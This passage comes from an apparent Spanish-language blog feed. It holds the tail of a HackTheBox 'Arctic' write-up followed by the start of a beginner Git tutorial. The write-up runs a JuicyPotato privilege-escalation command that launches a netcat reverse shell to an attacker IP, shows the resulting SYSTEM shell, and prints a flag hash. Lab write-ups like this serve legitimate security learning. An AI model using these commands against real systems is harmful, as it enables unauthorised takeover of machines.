-c &amp;lt;{clsid}&amp;gt;: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user

C:\Windows\Temp\Privesc&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Procedemos a ejecutarlo con los parametros necesarios:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Con &lt;code&gt;-t&lt;/code&gt; que es para crear un proceso vamos a usar &lt;code&gt;*&lt;/code&gt; para usar las dos opciones&lt;/li&gt;
  &lt;li&gt;Con &lt;code&gt;-l&lt;/code&gt; un puerto (puede ser el que quieras)&lt;/li&gt;
  &lt;li&gt;Con &lt;code&gt;-p&lt;/code&gt; vamos a ejecutar un programa, que en nuestro caso sera la &lt;code&gt;cmd.exe&lt;/code&gt; para atraves de ella ejecutar un comando privilegiado&lt;/li&gt;
  &lt;li&gt;Con &lt;code&gt;-a&lt;/code&gt; le pasaremos el argumentos, donde le pasaremos la ruta donde recide el &lt;code&gt;nc64.exe&lt;/code&gt; para enviarnos una consola interactiva&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Nos ponemos en escucha en nuestro equipo y proseguimos a ejecutarlo, si vemos que no nos hace nada, hay que ejecutarlo varias veces.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a &quot;/c C:\Windows\Temp\Privesc\nc64.exe -e cmd 10.10.16.8 443&quot;
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a &quot;/c C:\Windows\Temp\Privesc\nc64.exe -e cmd 10.10.16.8 443&quot;
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\Windows\Temp\PRIVESC&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y recibimos la conexión&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.11.
Ncat: Connection from 10.10.10.11:49816.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
nt authority\system
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo unico que nos queda por hacer es dirigirnos al directorio personal del usuario &lt;code&gt;administrator&lt;/code&gt; y visualizamos la segunda flag &lt;code&gt;root.txt&lt;/code&gt; :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

type root.txt
type root.txt
4804d15552ecad867e5f3b60985e1d34

C:\Users\Administrator\Desktop&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Tue, 11 Apr 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Arctic</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Arctic</guid>
        
        <category>Adobe Coldfusion</category>
        
        <category>Directory traversal</category>
        
        <category>Cracking hash</category>
        
        <category>Schedule Tasks</category>
        
        <category>Create malicius JSP</category>
        
        <category>Abusing SeimpersonatePrivilege</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Aprende a usar Git gratis desde cero y vuelvete un experto</title>
        <description>&lt;p&gt;Hola en esta ocasión hablaremos de &lt;code&gt;Git&lt;/code&gt; donde explicaremos paso a paso como funciona y el alcance que tiene que hace que sea necesario aprenderlo cuanto antes, asi que preparate por que debes aprender a usarlo a la de ya!.&lt;/p&gt;

&lt;h2 id=&quot;indice-y-estructura&quot;&gt;Indice y Estructura&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#que-es-git&quot;&gt;Que es Git?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#control-de-versiones&quot;&gt;Control de Versiones&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#repositorio&quot;&gt;Repositorio&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#repositorio-local&quot;&gt;Repositorio Local&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#repositorio-remoto&quot;&gt;Repositorio Remoto&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#commit-comprometer&quot;&gt;Commit - Comprometer&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instalación&quot;&gt;Instalación&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configuración&quot;&gt;Configuración&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#creación-del-repositorio&quot;&gt;Creación del Repositorio&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#areas-de-git&quot;&gt;Areas de Git&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#directorio-de-trabajo-working-direcotry&quot;&gt;Directorio de Trabajo - Working Directory &lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#area-de-preparación-staging-area&quot;&gt;Area de Preparación - Staging Area&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#repositorio-.git&quot;&gt;Repositorio .git - Repository .git&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#estados-de-git&quot;&gt;Estados de Git&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#modificada-modified&quot;&gt;Modificada - Modified&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#preparada-staged&quot;&gt;Preparada - Staged&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#confirmada-commited&quot;&gt;Confirmada - Commited&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#estado-del-repositorio&quot;&gt;Estado del Repositorio&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#renombrar-archivos-del-repositorio&quot;&gt;Renombrar archivos del Repositorio&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#eliminar-archivos-del-repositorio&quot;&gt;Eliminar archivos del Repositorio&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#gitignore-ignorar-archivos-y-directorios&quot;&gt;Gitignore - Ignorar archivos y directorios&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#creación-de-un-commit&quot;&gt;Creación de un Commit&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#estructura-del-commit&quot;&gt;Estructura del Commit&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#historial-de-commits&quot;&gt;Historial de Commits&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#creación-alterna-de-commits&quot;&gt;Creación Alterna de Commits&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#cambiar-descripción-del-commit&quot;&gt;Cambiar Descripción del Commit&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#revertir-commits&quot;&gt;Revertir Commits&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#branch-ramas&quot;&gt;Branch - Ramas&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#creación-de-un-branch&quot;&gt;Creación de un Branch&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#moverse-de-branch&quot;&gt;Moverse de Branch&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#cambiar-nombre-al-branch&quot;&gt;Cambiar Nombre al Branch&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#eliminar-un-branch&quot;&gt;Eliminar un Branch&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#crear-commits-en-un-branch&quot;&gt;Crear Commits en un Branch&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#historial-de-commits-en-branchs&quot;&gt;Historial de Commits en Branchs&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#merge-fusionar-branchs&quot;&gt;Merge - Fusionar Branchs&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#conflictos-en-merge-conflictos-al-fusionar-branchs&quot;&gt;Conflictos en Merge - Conflictos al fusionar branchs&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#conexión-con-github&quot;&gt;Conexión con Github&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;que-es-git&quot;&gt;Que es Git? &lt;a href=&quot;#que-es-git&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Es un sistema de control de versiones que nos va a permitir rastrear todos lo cambios que hemos hecho en un conjunto de archivos.&lt;/p&gt;

&lt;h2 id=&quot;control-de-versiones&quot;&gt;Control de Versiones &lt;a href=&quot;#control-de-versiones&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Viene a ser un sistema encargado de administrar los cambios que hemos realizado en un conjunto de  archivos o en programas de computadora.&lt;/p&gt;

&lt;h2 id=&quot;repositorio&quot;&gt;Repositorio &lt;a href=&quot;#repositorio&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Es un conjunto o colección de archivos de distintas versiones de un proyecto.&lt;/p&gt;

&lt;p&gt;Existen 2 tipos de de reposototios:&lt;/p&gt;

&lt;h3 id=&quot;repositorio-local&quot;&gt;Repositorio local &lt;a href=&quot;#repositorio-local&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Es local cuando esta almacenado unicamente en la pc que lo creamos donde solo nosotros tendremos acceso  a el.&lt;/p&gt;

&lt;h3 id=&quot;repositorio-remoto&quot;&gt;Repositorio Remoto &lt;a href=&quot;#repositorio-remoto&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Cuando queremos dar acceso a otros desarrolladores o colaboradores a nuestro repositorio o para tener una copia segura guardada en un servidor externo, creamos servidores remotos.&lt;/p&gt;

&lt;p&gt;Ambos tipos de repositorios trabajan juntos ya que podemos crear una copia local de un repositorio remoto en nuestra pc como local y podemos enviar tambien el repositorio local que creamos a un repositorio remoto.&lt;/p&gt;

&lt;h2 id=&quot;commit-comprometer&quot;&gt;Commit - Comprometer &lt;a href=&quot;#commit-comprometer&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Son un registro del estado de un proyecto en un momento especifico, a lo largo de la vida del proyecto.&lt;/p&gt;

&lt;p&gt;Supongamos que creamos un archivo, editamos el archivo, creamos una carpeta y borramosel archivo: cada una de estas acciones vendria a ser un &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/commits.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;instalación&quot;&gt;Instalación &lt;a href=&quot;#instalación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para poder instalar &lt;code&gt;Git&lt;/code&gt; si estamos en &lt;code&gt;windows&lt;/code&gt; debemos ir a la pagina oficial para poder descargalo y al ejecutarlo solo debemos seguir los pasos por defecto:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://git-scm.com/downloads&quot;&gt;https://git-scm.com/downloads&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;En nuestro caso ya que trabajaremos en &lt;code&gt;linux&lt;/code&gt; por ser mas comodo unicamente neceistamos ejecutar el comando &lt;code&gt;apt install git&lt;/code&gt; y ya lo tendriamos instalado&lt;/p&gt;

&lt;p&gt;En cuanto a lo demas todo es exactamente igual para cualquier sistema operativo en cuanto al desarrollo del curso despues de la instalación&lt;/p&gt;

&lt;h2 id=&quot;configuración&quot;&gt;Configuración &lt;a href=&quot;#configuración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Una vez tengamos ya instalado &lt;code&gt;Git&lt;/code&gt; en nuestro sistema para comenzar a trabajar vamos a crear un directorio en un ruta de nuestro sistema.&lt;/p&gt;

&lt;p&gt;En este caso creare el directorio &lt;code&gt;miGit&lt;/code&gt; usando el comando &lt;code&gt;mkdir&lt;/code&gt; y con &lt;code&gt;cd&lt;/code&gt; ingresare al directorio&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir miGit
❯ cd miGit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora procederemos a configurar algo muy importante en &lt;code&gt;Git&lt;/code&gt; que seria nuestro usuario y correo, ya que cada vez que creeemos un &lt;code&gt;commit&lt;/code&gt; se registrara la información de quien realizo el cambio. Esto es util ya que si estamos trabajando en un proyecto colaborativo, cada uno de los desarrolladores del proyecto podran saber quien realizo ese cambio y cual es su correo asociado; de igual manera si solo nosotros estamos trabajando en el proyecto podemos saber en un futuro que cambio realizamos.&lt;/p&gt;

&lt;p&gt;Para poder realizar la configuración del nombre de &lt;code&gt;usuario&lt;/code&gt; solo debemos ejecutar el siguiente comando.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git config --global user.name &quot;Firtsmiracle&quot;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;cabe mencionar que si unicamente deseamos esta configuración para un unico proyecto debemos omitir el uso de la bandera &lt;code&gt;--global&lt;/code&gt;, pero al ser nosotros dueños del repositorio es recomendable hacerlo globalmente.&lt;/p&gt;

&lt;p&gt;Si queremos ver que los cambios se realizaron correctamente usamos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git config user.name
Firtsmiracle
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De la misma manera si queremos configurar la información del &lt;code&gt;correo&lt;/code&gt;, usamos el comando:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git config --global user.email &quot;firtsmiracle@hotmail.com&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;volvemos a revisar si los cambios se guardaron exitosamente con el comando:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git config user.email
firtsmiracle@hotmail.com
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;creación-del-repositorio&quot;&gt;Creación de Repositorio &lt;a href=&quot;#creación-del-repositorio&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Una vez tengamos configurado nuestro nombre de &lt;code&gt;usuario&lt;/code&gt; y el &lt;code&gt;correo&lt;/code&gt;, finalmente podemos continuar con lo mas fundamental de &lt;code&gt;Git&lt;/code&gt;, que es la creación de un repositorio.&lt;/p&gt;

&lt;p&gt;Primeramente debemos estar dentro de nuestra carpeta o directorio de trabajo en nuestro caso en la carpeta &lt;code&gt;miGit&lt;/code&gt; con &lt;code&gt;pwd&lt;/code&gt; verificamos que estemos en la ruta&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ pwd
/home/fmiracle/Desktop/Prueba/Git/miGit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para poder crear el repositorio dentro de esa carpeta debemos ejecutar el siguente comando &lt;code&gt;git init&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git init
Inicializado repositorio Git vacío en /home/fmiracle/Desktop/Prueba/Git/miGit/.git/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Este comando nos inicializara un repositorio de &lt;code&gt;Git&lt;/code&gt; dentro de esta carpeta y con ello vamos a poder rastrear las versiones de todos los archivos que esten dentro de esta carpeta.&lt;/p&gt;

&lt;p&gt;Esto nos crea una carpeta de nombre &lt;code&gt;.git&lt;/code&gt; que se encuentra oculta como medida de seguridad, si deseamos verla podemos usar el comando &lt;code&gt;ls -la&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls -la
drwxr-xr-x root root  8 B Mon Apr 10 17:38:01 2023  .
drwxr-xr-x root root 10 B Mon Apr 10 17:37:56 2023  ..
drwxr-xr-x root root 98 B Mon Apr 10 17:38:01 2023  .git
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;areas-de-git&quot;&gt;Areas de Git &lt;a href=&quot;#areas-de-git&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Existen tres areas en las cuales puede estar un archivo &lt;code&gt;Git&lt;/code&gt;, donde cada una de ellas representara un estado distinto de un archivo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/areas.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;directorio-de-trabajo-working-direcotry&quot;&gt;Directorio de Trabajo - Working Directory &lt;a href=&quot;#directorio-de-trabajo-working-direcotry&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Es la carpeta del proyecto que justamente va a contener los archivos y el directorio oculto &lt;code&gt;.git&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;area-de-preparación-staging-area&quot;&gt;Area de Preparación - Staging Area &lt;a href=&quot;#area-de-preparación-staging-area&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Viene a ser una area intermedia entre el &lt;code&gt;directorio del trabajo&lt;/code&gt; y el &lt;code&gt;Repositorio&lt;/code&gt;, aqui se encuentran los archivos y cambios que seran incluidos en el proximo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Cabe mencionar que esta area no es definitiva para agregarla al repositorio, ya que podemos evaluar y retractar los cambios que realizamos para que no se incluyan en el proximo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Cuando ya tenemos todos los cambios listo en el area de preparación, ahora si podemos crear un &lt;code&gt;commit&lt;/code&gt; que sera el definitivo donde se encontraran los cambios que se agregaran al repositorio&lt;/p&gt;

&lt;h3 id=&quot;repositorio-.git&quot;&gt;Repositorio .git &lt;a href=&quot;#repositorio-.git&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Aqui se contienen todos los metadatos y versiones de todo nuestro proyecto, es la parte del repositorio que se copia al clonar un repositorio externo en nuestra pc, concretamente cuando hacemos &lt;code&gt;git clone https://github.com/nombre_repo&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Es la parte mas importante de &lt;code&gt;Git&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;estados-de-git&quot;&gt;Estados de Git &lt;a href=&quot;#estados-de-git&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Los archivos al estar en cada una de las areas mencionadas, repre/senta un estado distinto que podemos ver a continuación:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/Estados.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;modificada-modified&quot;&gt;Modificada - Modified &lt;a href=&quot;#modificada-modified&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;La versión del archivo esta &lt;code&gt;modificada&lt;/code&gt;, si la versión contiene cambios que no son parte del repositorio y no se han añadido al &lt;code&gt;area de preparación&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;preradara-staged&quot;&gt;Preparada - Staged &lt;a href=&quot;#preparada-staged&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;La versión es &lt;code&gt;preparada&lt;/code&gt;, cuando contiene cambios que no son parte del repositorio, pero si fue añadida al &lt;code&gt;area de preparación&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;confirmada-commited&quot;&gt;Confirmada - Commited &lt;a href=&quot;#confirmada-commited&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;La versión es &lt;code&gt;confirmada&lt;/code&gt;, si ya se encuentra en el directorio &lt;code&gt;.git&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;estado-del-repositorio&quot;&gt;Estado del Repositorio &lt;a href=&quot;#estado-del-repositorio&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para poder verificar el estado de nuestro repositorio podemos hacer uso del comando &lt;code&gt;git status&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main

No hay commits todavía

no hay nada para confirmar (crea/copia archivos y usa &quot;git add&quot; para hacerles seguimiento)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de ejecutar el comando nos muestra que estamos en la rama &lt;code&gt;main&lt;/code&gt;, que aun no hemos realizado un &lt;code&gt;commit&lt;/code&gt; y ademas vemos que tampoco hay nada pendiente para realizar un &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cabe mencionar que segun la instalación nuestra rama principal puede ser &lt;code&gt;main&lt;/code&gt; o &lt;code&gt;master&lt;/code&gt; y si deseamos cambiarla debemos ejecutar el comando &lt;code&gt;git config --global init.defaultBranch main&lt;/code&gt; para establecer &lt;code&gt;main&lt;/code&gt; como la rama principal por defecton, aunque de seguir con la que tenemos por defecto podemos trabajar sin problemas igualmente, pero hay que tenerlo en cuenta&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ahora que ocurre si yo creo un archivo lo llamaremos &lt;code&gt;archivo_git.txt&lt;/code&gt; y le introduciremos un contenido.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Este es mi primer repositorio
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Si volvemos a ejecutar el comando &lt;code&gt;git status&lt;/code&gt;, esta vez nos dice que tenemos archivos que no estamos haciendo seguimiento, concretamente el archivo que creamos &lt;code&gt;archivo_git.txt&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main

No hay commits todavía

Archivos sin seguimiento:
  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para incluirlo a lo que se será confirmado)
	archivo_git.txt

no hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa &quot;git add&quot; para hacerles seguimiento)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si queremos comenzar a hacer seguimiento del arhivo, debemos ejecutar el comando &lt;code&gt;git add&lt;/code&gt; y seguido el nombre del archivo&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;A simple vista parece no haberse ejecutado ningun cambio pero si volvemos a verificar el estado con &lt;code&gt;git status&lt;/code&gt;,  ahora si tenemos cambios que van a ser agregados al proximo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main

No hay commits todavía

Cambios a ser confirmados:
  (usa &quot;git rm --cached &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	nuevos archivos: archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Cuando vemos que el archivo ya es parte de los cambios que se agregaran a el proximo &lt;code&gt;commit&lt;/code&gt;, quiere decir que ya es parte del &lt;code&gt;area de preparación&lt;/code&gt;, pero recordemos que en esta area aun podemos retractarnos y decir a &lt;code&gt;Git&lt;/code&gt; que no queremos agregarlos al proximo &lt;code&gt;commit&lt;/code&gt;, y esto lo hacemos como nos indica &lt;code&gt;Git&lt;/code&gt; con el comando &lt;code&gt;git rm --cached&lt;/code&gt; y seguidamente el nombre del archivo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git rm --cached archivo_git.txt
rm 'archivo_git.txt'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Volvemos a verificar el estado y vemos que el archivo nuevamente no esta en seguimiento.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main

No hay commits todavía

Archivos sin seguimiento:
  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para incluirlo a lo que se será confirmado)
	archivo_git.txt

no hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa &quot;git add&quot; para hacerles seguimiento)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Saber esto es importante ya que en el &lt;code&gt;area de preparación&lt;/code&gt; los cambios no son definitivos, ya que podemos equivocarnos y por error incluir un archivo al &lt;code&gt;area de preparación&lt;/code&gt;podemos verificar que cambios seran agregados y si queremos removerlos del &lt;code&gt;area de preparación&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Ahora si queremos volver a colocar el archivo en el area de &lt;code&gt;preparación&lt;/code&gt;, usamos nuevamente el comando &lt;code&gt;git add&lt;/code&gt; y nuevamente vemos que hay cambios que seran agregados al proximo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add archivo_git.txt
❯ git status
En la rama main

No hay commits todavía

Cambios a ser confirmados:
  (usa &quot;git rm --cached &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	nuevos archivos: archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que faltaria ahora sera pasar el archivo del &lt;code&gt;area de preparación&lt;/code&gt; al repositorio como tal &lt;code&gt;.git&lt;/code&gt; para ello veamos a continuaciòn como creamos un &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;renombrar-archivos&quot;&gt;Renombrar Archivos del Repositorio &lt;a href=&quot;#renombrar-archivos&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Como vimos por cada acción que hagamos al archivo, al usar &lt;code&gt;git status&lt;/code&gt; nos saldra el mensaje de que hay archivos sin seguimiento y demos usar &lt;code&gt;git add&lt;/code&gt; para agregarlos. Concretamente en este caso si queremos renombar un archivo usamos el comando &lt;code&gt;mv&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Renombraremos el archivo que creamos &lt;code&gt;archivo.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 archivo.txt   archivo_git.txt
❯ mv archivo.txt archivo_renombrado.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente debemos agregar el archivo con &lt;code&gt;git add&lt;/code&gt; a el &lt;code&gt;area de preperación&lt;/code&gt;, despues de ejecutar &lt;code&gt;git status&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main
Archivos sin seguimiento:
  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para incluirlo a lo que se será confirmado)
	archivo_renombrado.txt

no hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa &quot;git add&quot; para hacerles seguimiento)
❯ git add archivo_renombrado.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El problema es que es mas tedioso y repetitivo estar ejecutando cada comando, por ello &lt;code&gt;Git&lt;/code&gt; nos da la opción de acortar todos estos pasos realizados solo usando un comando &lt;code&gt;git mv&lt;/code&gt; y seguido renombrar el archivo, practicamente lo mismo que ejecutamos al renombrarlo con &lt;code&gt;mv&lt;/code&gt; solo que ahora debemos anteponer la palabra &lt;code&gt;git&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;En este caso renombraremos el archivo &lt;code&gt;archivo_renombrado.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git mv archivo_renombrado.txt archivo_modificado.txt
❯ git status
En la rama main
Cambios a ser confirmados:
  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	nuevos archivos: archivo_modificado.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que usando el comando &lt;code&gt;git mv&lt;/code&gt; ya nos es necesario usar &lt;code&gt;git add&lt;/code&gt; ya que el archivo se agrega automaticamente al &lt;code&gt;area de preparación&lt;/code&gt;, lo que nos optimiza el proceso.&lt;/p&gt;

&lt;h3 id=&quot;eliminar-archivos-del-repositorio&quot;&gt;Eliminar archivos del Repositorio &lt;a href=&quot;#eliminar-archivos-del-repositorio&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

